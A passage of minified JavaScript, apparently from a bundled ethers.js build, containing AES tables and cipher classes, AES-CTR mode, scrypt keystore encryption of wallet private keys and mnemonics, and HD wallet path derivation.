2361698556, 1058709744, 752375421, 2431590963, 1321699145, 3519142200, 2734591178, 188127444, 2177869557, 3727205754, 2384911031, 3215212461, 2648976442, 2450346104, 3432737375, 1180849278, 331544205, 3102249176, 4150144569, 2952102595, 2159976285, 2474404304, 766078933, 313773861, 2570832044, 2108100632, 1668212892, 3145456443, 2013908262, 418672217, 3070356634, 2594734927, 1852171925, 3867060991, 3473416636, 3907448597, 2614737639, 919489135, 164948639, 2094410160, 2997825956, 590424639, 2486224549, 1723872674, 3157750862, 3399941250, 3501252752, 3625268135, 2555048196, 3673637356, 1343127501, 4130281361, 3599595085, 2957853679, 1297403050, 81781910, 3051593425, 2283490410, 532201772, 1367295589, 3926170974, 895287692, 1953757831, 1093597963, 492483431, 3528626907, 1446242576, 1192455638, 1636604631, 209336225, 344873464, 1015671571, 669961897, 3375740769, 3857572124, 2973530695, 3747192018, 1933530610, 3464042516, 935293895, 3454686199, 2858115069, 1863638845, 3683022916, 4085369519, 3292445032, 875313188, 1080017571, 3279033885, 621591778, 1233856572, 2504130317, 24197544, 3017672716, 3835484340, 3247465558, 2220981195, 3060847922, 1551124588, 1463996600]
  , Uhe = [4104605777, 1097159550, 396673818, 660510266, 2875968315, 2638606623, 4200115116, 3808662347, 821712160, 1986918061, 3430322568, 38544885, 3856137295, 718002117, 893681702, 1654886325, 2975484382, 3122358053, 3926825029, 4274053469, 796197571, 1290801793, 1184342925, 3556361835, 2405426947, 2459735317, 1836772287, 1381620373, 3196267988, 1948373848, 3764988233, 3385345166, 3263785589, 2390325492, 1480485785, 3111247143, 3780097726, 2293045232, 548169417, 3459953789, 3746175075, 439452389, 1362321559, 1400849762, 1685577905, 1806599355, 2174754046, 137073913, 1214797936, 1174215055, 3731654548, 2079897426, 1943217067, 1258480242, 529487843, 1437280870, 3945269170, 3049390895, 3313212038, 923313619, 679998e3, 3215307299, 57326082, 377642221, 3474729866, 2041877159, 133361907, 1776460110, 3673476453, 96392454, 878845905, 2801699524, 777231668, 4082475170, 2330014213, 4142626212, 2213296395, 1626319424, 1906247262, 1846563261, 562755902, 3708173718, 1040559837, 3871163981, 1418573201, 3294430577, 114585348, 1343618912, 2566595609, 3186202582, 1078185097, 3651041127, 3896688048, 2307622919, 425408743, 3371096953, 2081048481, 1108339068, 2216610296, 0, 2156299017, 736970802, 292596766, 1517440620, 251657213, 2235061775, 2933202493, 758720310, 265905162, 1554391400, 1532285339, 908999204, 174567692, 1474760595, 4002861748, 2610011675, 3234156416, 3693126241, 2001430874, 303699484, 2478443234, 2687165888, 585122620, 454499602, 151849742, 2345119218, 3064510765, 514443284, 4044981591, 1963412655, 2581445614, 2137062819, 19308535, 1928707164, 1715193156, 4219352155, 1126790795, 600235211, 3992742070, 3841024952, 836553431, 1669664834, 2535604243, 3323011204, 1243905413, 3141400786, 4180808110, 698445255, 2653899549, 2989552604, 2253581325, 3252932727, 3004591147, 1891211689, 2487810577, 3915653703, 4237083816, 4030667424, 2100090966, 865136418, 1229899655, 953270745, 3399679628, 3557504664, 4118925222, 2061379749, 3079546586, 2915017791, 983426092, 2022837584, 1607244650, 2118541908, 2366882550, 3635996816, 972512814, 3283088770, 1568718495, 3499326569, 3576539503, 621982671, 2895723464, 410887952, 2623762152, 1002142683, 645401037, 1494807662, 2595684844, 1335535747, 2507040230, 4293295786, 3167684641, 367585007, 3885750714, 1865862730, 2668221674, 2960971305, 2763173681, 1059270954, 2777952454, 2724642869, 1320957812, 2194319100, 2429595872, 2815956275, 77089521, 3973773121, 3444575871, 2448830231, 1305906550, 4021308739, 2857194700, 2516901860, 3518358430, 1787304780, 740276417, 1699839814, 1592394909, 2352307457, 2272556026, 188821243, 1729977011, 3687994002, 274084841, 3594982253, 3613494426, 2701949495, 4162096729, 322734571, 2837966542, 1640576439, 484830689, 1202797690, 3537852828, 4067639125, 349075736, 3342319475, 4157467219, 4255800159, 1030690015, 1155237496, 2951971274, 1757691577, 607398968, 2738905026, 499347990, 3794078908, 1011452712, 227885567, 2818666809, 213114376, 3034881240, 1455525988, 3414450555, 850817237, 1817998408, 3092726480]
  , khe = [0, 235474187, 470948374, 303765277, 941896748, 908933415, 607530554, 708780849, 1883793496, 2118214995, 1817866830, 1649639237, 1215061108, 1181045119, 1417561698, 1517767529, 3767586992, 4003061179, 4236429990, 4069246893, 3635733660, 3602770327, 3299278474, 3400528769, 2430122216, 2664543715, 2362090238, 2193862645, 2835123396, 2801107407, 3035535058, 3135740889, 3678124923, 3576870512, 3341394285, 3374361702, 3810496343, 3977675356, 4279080257, 4043610186, 2876494627, 2776292904, 3076639029, 3110650942, 2472011535, 2640243204, 2403728665, 2169303058, 1001089995, 899835584, 666464733, 699432150, 59727847, 226906860, 530400753, 294930682, 1273168787, 1172967064, 1475418501, 1509430414, 1942435775, 2110667444, 1876241833, 1641816226, 2910219766, 2743034109, 2976151520, 3211623147, 2505202138, 2606453969, 2302690252, 2269728455, 3711829422, 3543599269, 3240894392, 3475313331, 3843699074, 3943906441, 4178062228, 4144047775, 1306967366, 1139781709, 1374988112, 1610459739, 1975683434, 2076935265, 1775276924, 1742315127, 1034867998, 866637845, 566021896, 800440835, 92987698, 193195065, 429456164, 395441711, 1984812685, 2017778566, 1784663195, 1683407248, 1315562145, 1080094634, 1383856311, 1551037884, 101039829, 135050206, 437757123, 337553864, 1042385657, 807962610, 573804783, 742039012, 2531067453, 2564033334, 2328828971, 2227573024, 2935566865, 2700099354, 3001755655, 3168937228, 3868552805, 3902563182, 4203181171, 4102977912, 3736164937, 3501741890, 3265478751, 3433712980, 1106041591, 1340463100, 1576976609, 1408749034, 2043211483, 2009195472, 1708848333, 1809054150, 832877231, 1068351396, 766945465, 599762354, 159417987, 126454664, 361929877, 463180190, 2709260871, 2943682380, 3178106961, 3009879386, 2572697195, 2538681184, 2236228733, 2336434550, 3509871135, 3745345300, 3441850377, 3274667266, 3910161971, 3877198648, 4110568485, 4211818798, 2597806476, 2497604743, 2261089178, 2295101073, 2733856160, 2902087851, 3202437046, 2968011453, 3936291284, 3835036895, 4136440770, 4169408201, 3535486456, 3702665459, 3467192302, 3231722213, 2051518780, 1951317047, 1716890410, 1750902305, 1113818384, 1282050075, 1584504582, 1350078989, 168810852, 67556463, 371049330, 404016761, 841739592, 1008918595, 775550814, 540080725, 3969562369, 3801332234, 4035489047, 4269907996, 3569255213, 3669462566, 3366754619, 3332740144, 2631065433, 2463879762, 2160117071, 2395588676, 2767645557, 2868897406, 3102011747, 3069049960, 202008497, 33778362, 270040487, 504459436, 875451293, 975658646, 675039627, 641025152, 2084704233, 1917518562, 1615861247, 1851332852, 1147550661, 1248802510, 1484005843, 1451044056, 933301370, 967311729, 733156972, 632953703, 260388950, 25965917, 328671808, 496906059, 1206477858, 1239443753, 1543208500, 1441952575, 2144161806, 1908694277, 1675577880, 1842759443, 3610369226, 3644379585, 3408119516, 3307916247, 4011190502, 3776767469, 4077384432, 4245618683, 2809771154, 2842737049, 3144396420, 3043140495, 2673705150, 2438237621, 2203032232, 2370213795]
  , Lhe = [0, 185469197, 370938394, 487725847, 741876788, 657861945, 975451694, 824852259, 1483753576, 1400783205, 1315723890, 1164071807, 1950903388, 2135319889, 1649704518, 1767536459, 2967507152, 3152976349, 2801566410, 2918353863, 2631447780, 2547432937, 2328143614, 2177544179, 3901806776, 3818836405, 4270639778, 4118987695, 3299409036, 3483825537, 3535072918, 3652904859, 2077965243, 1893020342, 1841768865, 1724457132, 1474502543, 1559041666, 1107234197, 1257309336, 598438867, 681933534, 901210569, 1052338372, 261314535, 77422314, 428819965, 310463728, 3409685355, 3224740454, 3710368113, 3593056380, 3875770207, 3960309330, 4045380933, 4195456072, 2471224067, 2554718734, 2237133081, 2388260884, 3212035895, 3028143674, 2842678573, 2724322336, 4138563181, 4255350624, 3769721975, 3955191162, 3667219033, 3516619604, 3431546947, 3347532110, 2933734917, 2782082824, 3099667487, 3016697106, 2196052529, 2313884476, 2499348523, 2683765030, 1179510461, 1296297904, 1347548327, 1533017514, 1786102409, 1635502980, 2087309459, 2003294622, 507358933, 355706840, 136428751, 53458370, 839224033, 957055980, 605657339, 790073846, 2373340630, 2256028891, 2607439820, 2422494913, 2706270690, 2856345839, 3075636216, 3160175349, 3573941694, 3725069491, 3273267108, 3356761769, 4181598602, 4063242375, 4011996048, 3828103837, 1033297158, 915985419, 730517276, 545572369, 296679730, 446754879, 129166120, 213705253, 1709610350, 1860738147, 1945798516, 2029293177, 1239331162, 1120974935, 1606591296, 1422699085, 4148292826, 4233094615, 3781033664, 3931371469, 3682191598, 3497509347, 3446004468, 3328955385, 2939266226, 2755636671, 3106780840, 2988687269, 2198438022, 2282195339, 2501218972, 2652609425, 1201765386, 1286567175, 1371368976, 1521706781, 1805211710, 1620529459, 2105887268, 1988838185, 533804130, 350174575, 164439672, 46346101, 870912086, 954669403, 636813900, 788204353, 2358957921, 2274680428, 2592523643, 2441661558, 2695033685, 2880240216, 3065962831, 3182487618, 3572145929, 3756299780, 3270937875, 3388507166, 4174560061, 4091327024, 4006521127, 3854606378, 1014646705, 930369212, 711349675, 560487590, 272786309, 457992840, 106852767, 223377554, 1678381017, 1862534868, 1914052035, 2031621326, 1211247597, 1128014560, 1580087799, 1428173050, 32283319, 182621114, 401639597, 486441376, 768917123, 651868046, 1003007129, 818324884, 1503449823, 1385356242, 1333838021, 1150208456, 1973745387, 2125135846, 1673061617, 1756818940, 2970356327, 3120694122, 2802849917, 2887651696, 2637442643, 2520393566, 2334669897, 2149987652, 3917234703, 3799141122, 4284502037, 4100872472, 3309594171, 3460984630, 3545789473, 3629546796, 2050466060, 1899603969, 1814803222, 1730525723, 1443857720, 1560382517, 1075025698, 1260232239, 575138148, 692707433, 878443390, 1062597235, 243256656, 91341917, 409198410, 325965383, 3403100636, 3252238545, 3704300486, 3620022987, 3874428392, 3990953189, 4042459122, 4227665663, 2460449204, 2578018489, 2226875310, 2411029155, 3198115200, 3046200461, 2827177882, 2743944855]
  , $he = [0, 218828297, 437656594, 387781147, 875313188, 958871085, 775562294, 590424639, 1750626376, 1699970625, 1917742170, 2135253587, 1551124588, 1367295589, 1180849278, 1265195639, 3501252752, 3720081049, 3399941250, 3350065803, 3835484340, 3919042237, 4270507174, 4085369519, 3102249176, 3051593425, 2734591178, 2952102595, 2361698556, 2177869557, 2530391278, 2614737639, 3145456443, 3060847922, 2708326185, 2892417312, 2404901663, 2187128086, 2504130317, 2555048196, 3542330227, 3727205754, 3375740769, 3292445032, 3876557655, 3926170974, 4246310725, 4027744588, 1808481195, 1723872674, 1910319033, 2094410160, 1608975247, 1391201670, 1173430173, 1224348052, 59984867, 244860394, 428169201, 344873464, 935293895, 984907214, 766078933, 547512796, 1844882806, 1627235199, 2011214180, 2062270317, 1507497298, 1423022939, 1137477952, 1321699145, 95345982, 145085239, 532201772, 313773861, 830661914, 1015671571, 731183368, 648017665, 3175501286, 2957853679, 2807058932, 2858115069, 2305455554, 2220981195, 2474404304, 2658625497, 3575528878, 3625268135, 3473416636, 3254988725, 3778151818, 3963161475, 4213447064, 4130281361, 3599595085, 3683022916, 3432737375, 3247465558, 3802222185, 4020912224, 4172763771, 4122762354, 3201631749, 3017672716, 2764249623, 2848461854, 2331590177, 2280796200, 2431590963, 2648976442, 104699613, 188127444, 472615631, 287343814, 840019705, 1058709744, 671593195, 621591778, 1852171925, 1668212892, 1953757831, 2037970062, 1514790577, 1463996600, 1080017571, 1297403050, 3673637356, 3623636965, 3235995134, 3454686199, 4007360968, 3822090177, 4107101658, 4190530515, 2997825956, 3215212461, 2830708150, 2779915199, 2256734592, 2340947849, 2627016082, 2443058075, 172466556, 122466165, 273792366, 492483431, 1047239e3, 861968209, 612205898, 695634755, 1646252340, 1863638845, 2013908262, 1963115311, 1446242576, 1530455833, 1277555970, 1093597963, 1636604631, 1820824798, 2073724613, 1989249228, 1436590835, 1487645946, 1337376481, 1119727848, 164948639, 81781910, 331544205, 516552836, 1039717051, 821288114, 669961897, 719700128, 2973530695, 3157750862, 2871682645, 2787207260, 2232435299, 2283490410, 2667994737, 2450346104, 3647212047, 3564045318, 3279033885, 3464042516, 3980931627, 3762502690, 4150144569, 4199882800, 3070356634, 3121275539, 2904027272, 2686254721, 2200818878, 2384911031, 2570832044, 2486224549, 3747192018, 3528626907, 3310321856, 3359936201, 3950355702, 3867060991, 4049844452, 4234721005, 1739656202, 1790575107, 2108100632, 1890328081, 1402811438, 1586903591, 1233856572, 1149249077, 266959938, 48394827, 369057872, 418672217, 1002783846, 919489135, 567498868, 752375421, 209336225, 24197544, 376187827, 459744698, 945164165, 895287692, 574624663, 793451934, 1679968233, 1764313568, 2117360635, 1933530610, 1343127501, 1560637892, 1243112415, 1192455638, 3704280881, 3519142200, 3336358691, 3419915562, 3907448597, 3857572124, 4075877127, 4294704398, 3029510009, 3113855344, 2927934315, 2744104290, 2159976285, 2377486676, 2594734927, 2544078150]
  , zhe = [0, 151849742, 303699484, 454499602, 607398968, 758720310, 908999204, 1059270954, 1214797936, 1097159550, 1517440620, 1400849762, 1817998408, 1699839814, 2118541908, 2001430874, 2429595872, 2581445614, 2194319100, 2345119218, 3034881240, 3186202582, 2801699524, 2951971274, 3635996816, 3518358430, 3399679628, 3283088770, 4237083816, 4118925222, 4002861748, 3885750714, 1002142683, 850817237, 698445255, 548169417, 529487843, 377642221, 227885567, 77089521, 1943217067, 2061379749, 1640576439, 1757691577, 1474760595, 1592394909, 1174215055, 1290801793, 2875968315, 2724642869, 3111247143, 2960971305, 2405426947, 2253581325, 2638606623, 2487810577, 3808662347, 3926825029, 4044981591, 4162096729, 3342319475, 3459953789, 3576539503, 3693126241, 1986918061, 2137062819, 1685577905, 1836772287, 1381620373, 1532285339, 1078185097, 1229899655, 1040559837, 923313619, 740276417, 621982671, 439452389, 322734571, 137073913, 19308535, 3871163981, 4021308739, 4104605777, 4255800159, 3263785589, 3414450555, 3499326569, 3651041127, 2933202493, 2815956275, 3167684641, 3049390895, 2330014213, 2213296395, 2566595609, 2448830231, 1305906550, 1155237496, 1607244650, 1455525988, 1776460110, 1626319424, 2079897426, 1928707164, 96392454, 213114376, 396673818, 514443284, 562755902, 679998e3, 865136418, 983426092, 3708173718, 3557504664, 3474729866, 3323011204, 4180808110, 4030667424, 3945269170, 3794078908, 2507040230, 2623762152, 2272556026, 2390325492, 2975484382, 3092726480, 2738905026, 2857194700, 3973773121, 3856137295, 4274053469, 4157467219, 3371096953, 3252932727, 3673476453, 3556361835, 2763173681, 2915017791, 3064510765, 3215307299, 2156299017, 2307622919, 2459735317, 2610011675, 2081048481, 1963412655, 1846563261, 1729977011, 1480485785, 1362321559, 1243905413, 1126790795, 878845905, 1030690015, 645401037, 796197571, 274084841, 425408743, 38544885, 188821243, 3613494426, 3731654548, 3313212038, 3430322568, 4082475170, 4200115116, 3780097726, 3896688048, 2668221674, 2516901860, 2366882550, 2216610296, 3141400786, 2989552604, 2837966542, 2687165888, 1202797690, 1320957812, 1437280870, 1554391400, 1669664834, 1787304780, 1906247262, 2022837584, 265905162, 114585348, 499347990, 349075736, 736970802, 585122620, 972512814, 821712160, 2595684844, 2478443234, 2293045232, 2174754046, 3196267988, 3079546586, 2895723464, 2777952454, 3537852828, 3687994002, 3234156416, 3385345166, 4142626212, 4293295786, 3841024952, 3992742070, 174567692, 57326082, 410887952, 292596766, 777231668, 660510266, 1011452712, 893681702, 1108339068, 1258480242, 1343618912, 1494807662, 1715193156, 1865862730, 1948373848, 2100090966, 2701949495, 2818666809, 3004591147, 3122358053, 2235061775, 2352307457, 2535604243, 2653899549, 3915653703, 3764988233, 4219352155, 4067639125, 3444575871, 3294430577, 3746175075, 3594982253, 836553431, 953270745, 600235211, 718002117, 367585007, 484830689, 133361907, 251657213, 2041877159, 1891211689, 1806599355, 1654886325, 1568718495, 1418573201, 1335535747, 1184342925];
function K2(r) {
    const e = [];
    for (let t = 0; t < r.length; t += 4)
        e.push(r[t] << 24 | r[t + 1] << 16 | r[t + 2] << 8 | r[t + 3]);
    return e
}
class d4 {
    get key() {
        return kn(this, Wm, "f").slice()
    }
    constructor(e) {
        if (Wm.set(this, void 0),
        _i.set(this, void 0),
        Ms.set(this, void 0),
        !(this instanceof d4))
            throw Error("AES must be instanitated with `new`");
        G2(this, Wm, new Uint8Array(e), "f");
        const t = _he[this.key.length];
        if (t == null)
            throw new TypeError("invalid key size (must be 16, 24 or 32 bytes)");
        G2(this, Ms, [], "f"),
        G2(this, _i, [], "f");
        for (let h = 0; h <= t; h++)
            kn(this, Ms, "f").push([0, 0, 0, 0]),
            kn(this, _i, "f").push([0, 0, 0, 0]);
        const o = (t + 1) * 4
          , i = this.key.length / 4
          , n = K2(this.key);
        let s;
        for (let h = 0; h < i; h++)
            s = h >> 2,
            kn(this, Ms, "f")[s][h % 4] = n[h],
            kn(this, _i, "f")[t - s][h % 4] = n[h];
        let a = 0, l = i, f;
        for (; l < o; ) {
            if (f = n[i - 1],
            n[0] ^= Ai[f >> 16 & 255] << 24 ^ Ai[f >> 8 & 255] << 16 ^ Ai[f & 255] << 8 ^ Ai[f >> 24 & 255] ^ Ihe[a] << 24,
            a += 1,
            i != 8)
                for (let v = 1; v < i; v++)
                    n[v] ^= n[v - 1];
            else {
                for (let v = 1; v < i / 2; v++)
                    n[v] ^= n[v - 1];
                f = n[i / 2 - 1],
                n[i / 2] ^= Ai[f & 255] ^ Ai[f >> 8 & 255] << 8 ^ Ai[f >> 16 & 255] << 16 ^ Ai[f >> 24 & 255] << 24;
                for (let v = i / 2 + 1; v < i; v++)
                    n[v] ^= n[v - 1]
            }
            let h = 0, p, b;
            for (; h < i && l < o; )
                p = l >> 2,
                b = l % 4,
                kn(this, Ms, "f")[p][b] = n[h],
                kn(this, _i, "f")[t - p][b] = n[h++],
                l++
        }
        for (let h = 1; h < t; h++)
            for (let p = 0; p < 4; p++)
                f = kn(this, _i, "f")[h][p],
                kn(this, _i, "f")[h][p] = khe[f >> 24 & 255] ^ Lhe[f >> 16 & 255] ^ $he[f >> 8 & 255] ^ zhe[f & 255]
    }
    encrypt(e) {
        if (e.length != 16)
            throw new TypeError("invalid plaintext size (must be 16 bytes)");
        const t = kn(this, Ms, "f").length - 1
          , o = [0, 0, 0, 0];
        let i = K2(e);
        for (let a = 0; a < 4; a++)
            i[a] ^= kn(this, Ms, "f")[0][a];
        for (let a = 1; a < t; a++) {
            for (let l = 0; l < 4; l++)
                o[l] = Ohe[i[l] >> 24 & 255] ^ Rhe[i[(l + 1) % 4] >> 16 & 255] ^ Whe[i[(l + 2) % 4] >> 8 & 255] ^ Mhe[i[(l + 3) % 4] & 255] ^ kn(this, Ms, "f")[a][l];
            i = o.slice()
        }
        const n = new Uint8Array(16);
        let s = 0;
        for (let a = 0; a < 4; a++)
            s = kn(this, Ms, "f")[t][a],
            n[4 * a] = (Ai[i[a] >> 24 & 255] ^ s >> 24) & 255,
            n[4 * a + 1] = (Ai[i[(a + 1) % 4] >> 16 & 255] ^ s >> 16) & 255,
            n[4 * a + 2] = (Ai[i[(a + 2) % 4] >> 8 & 255] ^ s >> 8) & 255,
            n[4 * a + 3] = (Ai[i[(a + 3) % 4] & 255] ^ s) & 255;
        return n
    }
    decrypt(e) {
        if (e.length != 16)
            throw new TypeError("invalid ciphertext size (must be 16 bytes)");
        const t = kn(this, _i, "f").length - 1
          , o = [0, 0, 0, 0];
        let i = K2(e);
        for (let a = 0; a < 4; a++)
            i[a] ^= kn(this, _i, "f")[0][a];
        for (let a = 1; a < t; a++) {
            for (let l = 0; l < 4; l++)
                o[l] = Nhe[i[l] >> 24 & 255] ^ Dhe[i[(l + 3) % 4] >> 16 & 255] ^ Fhe[i[(l + 2) % 4] >> 8 & 255] ^ Uhe[i[(l + 1) % 4] & 255] ^ kn(this, _i, "f")[a][l];
            i = o.slice()
        }
        const n = new Uint8Array(16);
        let s = 0;
        for (let a = 0; a < 4; a++)
            s = kn(this, _i, "f")[t][a],
            n[4 * a] = (fm[i[a] >> 24 & 255] ^ s >> 24) & 255,
            n[4 * a + 1] = (fm[i[(a + 3) % 4] >> 16 & 255] ^ s >> 16) & 255,
            n[4 * a + 2] = (fm[i[(a + 2) % 4] >> 8 & 255] ^ s >> 8) & 255,
            n[4 * a + 3] = (fm[i[(a + 1) % 4] & 255] ^ s) & 255;
        return n
    }
}
Wm = new WeakMap,
_i = new WeakMap,
Ms = new WeakMap;
class jhe {
    constructor(e, t, o) {
        if (o && !(this instanceof o))
            throw new Error(`${e} must be instantiated with "new"`);
        Object.defineProperties(this, {
            aes: {
                enumerable: !0,
                value: new d4(t)
            },
            name: {
                enumerable: !0,
                value: e
            }
        })
    }
}
var Ff = function(r, e, t, o, i) {
    if (o === "m")
        throw new TypeError("Private method is not writable");
    if (o === "a" && !i)
        throw new TypeError("Private accessor was defined without a setter");
    if (typeof e == "function" ? r !== e || !i : !e.has(r))
        throw new TypeError("Cannot write private member to an object whose class did not declare it");
    return o === "a" ? i.call(r, t) : i ? i.value = t : e.set(r, t),
    t
}, Pi = function(r, e, t, o) {
    if (t === "a" && !o)
        throw new TypeError("Private accessor was defined without a getter");
    if (typeof e == "function" ? r !== e || !o : !e.has(r))
        throw new TypeError("Cannot read private member from an object whose class did not declare it");
    return t === "m" ? o : t === "a" ? o.call(r) : o ? o.value : e.get(r)
}, _p, Ol, Ii;
class f1 extends jhe {
    constructor(e, t) {
        super("CTR", e, f1),
        _p.set(this, void 0),
        Ol.set(this, void 0),
        Ii.set(this, void 0),
        Ff(this, Ii, new Uint8Array(16), "f"),
        Pi(this, Ii, "f").fill(0),
        Ff(this, _p, Pi(this, Ii, "f"), "f"),
        Ff(this, Ol, 16, "f"),
        t == null && (t = 1),
        typeof t == "number" ? this.setCounterValue(t) : this.setCounterBytes(t)
    }
    get counter() {
        return new Uint8Array(Pi(this, Ii, "f"))
    }
    setCounterValue(e) {
        if (!Number.isInteger(e) || e < 0 || e > Number.MAX_SAFE_INTEGER)
            throw new TypeError("invalid counter initial integer value");
        for (let t = 15; t >= 0; --t)
            Pi(this, Ii, "f")[t] = e % 256,
            e = Math.floor(e / 256)
    }
    setCounterBytes(e) {
        if (e.length !== 16)
            throw new TypeError("invalid counter initial Uint8Array value length");
        Pi(this, Ii, "f").set(e)
    }
    increment() {
        for (let e = 15; e >= 0; e--)
            if (Pi(this, Ii, "f")[e] === 255)
                Pi(this, Ii, "f")[e] = 0;
            else {
                Pi(this, Ii, "f")[e]++;
                break
            }
    }
    encrypt(e) {
        var t, o;
        const i = new Uint8Array(e);
        for (let n = 0; n < i.length; n++)
            Pi(this, Ol, "f") === 16 && (Ff(this, _p, this.aes.encrypt(Pi(this, Ii, "f")), "f"),
            Ff(this, Ol, 0, "f"),
            this.increment()),
            i[n] ^= Pi(this, _p, "f")[Ff(this, Ol, (o = Pi(this, Ol, "f"),
            t = o++,
            o), "f"),
            t];
        return i
    }
    decrypt(e) {
        return this.encrypt(e)
    }
}
_p = new WeakMap,
Ol = new WeakMap,
Ii = new WeakMap;
function Tp(r, e) {
    for (r = String(r); r.length < e; )
        r = "0" + r;
    return r
}
function TF(r) {
    return typeof r == "string" ? Fo(r, "NFKC") : eo(r)
}
const qhe = "m/44'/60'/0'/0/0";
function EF(r) {
    const e = r.salt != null ? pt(r.salt, "options.salt") : qa(32);
    let t = 1 << 17
      , o = 8
      , i = 1;
    return r.scrypt && (r.scrypt.N && (t = r.scrypt.N),
    r.scrypt.r && (o = r.scrypt.r),
    r.scrypt.p && (i = r.scrypt.p)),
    pe(typeof t == "number" && t > 0 && Number.isSafeInteger(t) && (BigInt(t) & BigInt(t - 1)) === BigInt(0), "invalid scrypt N parameter", "options.N", t),
    pe(typeof o == "number" && o > 0 && Number.isSafeInteger(o), "invalid scrypt r parameter", "options.r", o),
    pe(typeof i == "number" && i > 0 && Number.isSafeInteger(i), "invalid scrypt p parameter", "options.p", i),
    {
        name: "scrypt",
        dkLen: 32,
        salt: e,
        N: t,
        r: o,
        p: i
    }
}
function AF(r, e, t, o) {
    const i = pt(t.privateKey, "privateKey")
      , n = o.iv != null ? pt(o.iv, "options.iv") : qa(16);
    pe(n.length === 16, "invalid options.iv length", "options.iv", o.iv);
    const s = o.uuid != null ? pt(o.uuid, "options.uuid") : qa(16);
    pe(s.length === 16, "invalid options.uuid length", "options.uuid", o.iv);
    const a = r.slice(0, 16)
      , l = r.slice(16, 32)
      , f = new f1(a,n)
      , h = pt(f.encrypt(i))
      , p = ir(Ar([l, h]))
      , b = {
        address: t.address.substring(2).toLowerCase(),
        id: Fue(s),
        version: 3,
        Crypto: {
            cipher: "aes-128-ctr",
            cipherparams: {
                iv: et(n).substring(2)
            },
            ciphertext: et(h).substring(2),
            kdf: "scrypt",
            kdfparams: {
                salt: et(e.salt).substring(2),
                n: e.N,
                dklen: 32,
                p: e.p,
                r: e.r
            },
            mac: p.substring(2)
        }
    };
    if (t.mnemonic) {
        const v = o.client != null ? o.client : `ethers/${YD}`
          , T = t.mnemonic.path || qhe
          , x = t.mnemonic.locale || "en"
          , E = r.slice(32, 64)
          , B = pt(t.mnemonic.entropy, "account.mnemonic.entropy")
          , P = qa(16)
          , O = new f1(E,P)
          , F = pt(O.encrypt(B))
          , D = new Date
          , M = "UTC--" + (D.getUTCFullYear() + "-" + Tp(D.getUTCMonth() + 1, 2) + "-" + Tp(D.getUTCDate(), 2) + "T" + Tp(D.getUTCHours(), 2) + "-" + Tp(D.getUTCMinutes(), 2) + "-" + Tp(D.getUTCSeconds(), 2) + ".0Z") + "--" + b.address;
        b["x-ethers"] = {
            client: v,
            gethFilename: M,
            path: T,
            locale: x,
            mnemonicCounter: et(P).substring(2),
            mnemonicCiphertext: et(F).substring(2),
            version: "0.1"
        }
    }
    return JSON.stringify(b)
}
function Vhe(r, e, t) {
    t == null && (t = {});
    const o = TF(e)
      , i = EF(t)
      , n = O0(o, i.salt, i.N, i.r, i.p, 64);
    return AF(pt(n), i, r, t)
}
async function Hhe(r, e, t) {
    t == null && (t = {});
    const o = TF(e)
      , i = EF(t)
      , n = await I0(o, i.salt, i.N, i.r, i.p, 64, t.progressCallback);
    return AF(pt(n), i, r, t)
}
const Z2 = "m/44'/60'/0'/0/0"
  , Ghe = new Uint8Array([66, 105, 116, 99, 111, 105, 110, 32, 115, 101, 101, 100])
  , Xf = 2147483648
  , Khe = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141")
  , Zhe = "0123456789abcdef";
function d1(r, e) {
    let t = "";
    for (; r; )
        t = Zhe[r % 16] + t,
        r = Math.trunc(r / 16);
    for (; t.length < e * 2; )
        t = "0" + t;
    return "0x" + t
}
function PA(r) {
    const e = pt(r)
      , t = Ia(no(no(e)), 0, 4)
      , o = Ar([e, t]);
    return _ue(o)
}
const Us = {};
function PF(r, e, t, o) {
    const i = new Uint8Array(37);
    r & Xf ? (Mt(o != null, "cannot derive child of neutered node", "UNSUPPORTED_OPERATION", {
        operation: "deriveChild"
    }),
    i.set(pt(o), 1)) : i.set(pt(t));
    for (let s = 24; s >= 0; s -= 8)
        i[33 + (s >> 3)] = r >> 24 - s & 255;
    const n = pt(Vc("sha512", e, i));
    return {
        IL: n.slice(0, 32),
        IR: n.slice(32)
    }
}
function CF(r, e) {
    const t = e.split("/");
    pe(t.length > 0, "invalid path", "path", e),
    t[0] === "m" && (pe(r.depth === 0, `cannot derive root path (i.e. path starting with "m/") for a node at non-zero depth ${r.depth}`, "path", e),
    t.shift());
    let o = r;
    for (let i = 0; i < t.length; i++) {
        const n = t[i];
        if (n.match(/^[0-9]+'$/)) {
            const s = parseInt(n.substring(0, n.length - 1));
            pe(s < Xf, "invalid path index", `path[${i}]`, n),
            o = o.deriveChild(Xf + s)
        } else if (n.match(/^[0-9]+$/)) {
            const s = parseInt(n);
            pe(s < Xf, "invalid path index", `path[${i}]`, n),
            o = o.deriveChild(s)
        } else
            pe(!1, "invalid path component", `path[${i}]`, n)
    }
    return o
}
var a0, CA, eu, Ip;
const es = class es extends EA {
    constructor(t, o, i, n, s, a, l, f, h) {
        super(o, h);
        ft(this, a0);
        we(this, "publicKey");
        we(this, "fingerprint");
        we(this, "parentFingerprint");
        we(this, "mnemonic");
        we(this, "chainCode");
        we(this, "path");
        we(this, "index");
        we(this, "depth");
        el(t, Us, "HDNodeWallet"),
        tr(this, {
            publicKey: o.compressedPublicKey
        });
        const p = Ia(th(no(this.publicKey)), 0, 4);
        tr(this, {
            parentFingerprint: i,
            fingerprint: p,
            chainCode: n,
            path: s,
            index: a,
            depth: l
        }),
        tr(this, {
            mnemonic: f
        })
    }
    connect(t) {
        return new es(Us,this.signingKey,this.parentFingerprint,this.chainCode,this.path,this.index,this.depth,this.mnemonic,t)
    }
    async encrypt(t, o) {
        return await Hhe(Dt(this, a0, CA).call(this), t, {
            progressCallback: o
        })
    }
    encryptSync(t) {
        return Vhe(Dt(this, a0, CA).call(this), t)
    }
    get extendedKey() {
        return Mt(this.depth < 256, "Depth too deep", "UNSUPPORTED_OPERATION", {
            operation: "extendedKey"
        }),
        PA(Ar(["0x0488ADE4", d1(this.depth, 1), this.parentFingerprint, d1(this.index, 4), this.chainCode, Ar(["0x00", this.privateKey])]))
    }
    hasPath() {
        return this.path != null
    }
    neuter() {
        return new Jp(Us,this.address,this.publicKey,this.parentFingerprint,this.chainCode,this.path,this.index,this.depth,this.provider)
    }
    deriveChild(t) {
        const o = jn(t, "index");
        pe(o <= 4294967295, "invalid index", "index", o);
        let i = this.path;
        i && (i += "/" + (o & 2147483647),
        o & Xf && (i += "'"));
        const {IR: n, IL: s} = PF(o, this.chainCode, this.publicKey, this.privateKey)
          , a = new li(cs((H1(s) + BigInt(this.privateKey)) % Khe, 32));
